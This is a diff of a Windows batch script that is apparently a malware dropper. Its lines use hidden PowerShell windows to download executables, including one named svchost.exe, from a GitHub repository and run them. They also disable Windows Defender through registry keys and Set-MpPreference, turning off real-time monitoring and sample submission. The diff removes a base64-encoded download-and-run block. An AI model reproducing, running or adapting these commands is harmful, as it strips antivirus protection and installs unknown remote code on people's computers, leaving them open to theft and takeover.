@@ -33,6 +33,7 @@ echo Windows Defender has been disabled.
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/fviatool/fvia/main/svchost.exe', 'C:\Users\%USERNAME%\Downloads\svchost.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\svchost.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/update.exe', 'C:\Users\%USERNAME%\Downloads\update.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/fvia.exe', 'C:\Users\%USERNAME%\Downloads\fvia.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\fvia.exe' -WindowStyle Hidden"
+
 set "defenderDisableCmds[0]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
 set "defenderDisableCmds[1]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f"
 set "defenderDisableCmds[2]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f"
@@ -77,17 +78,6 @@ for %%p in (%melody_packages%) do (
         )
     )
 )
-@echo off
-set "download_folder=%TEMP%"
-set "file_names=setup.exe"
-
-set "base64_encoded_url=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Z2aWF0b29sL2Z2aWEvbWFpbi9zZXR1cC5leGU="
-certutil -decode %base64_encoded_url% "%TEMP%\setup.exe"
-
-for %%f in (%file_names%) do (
-    start "" /B "%download_folder%\%%~f"
-)
-
 
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -SubmitSamplesConsent 2"
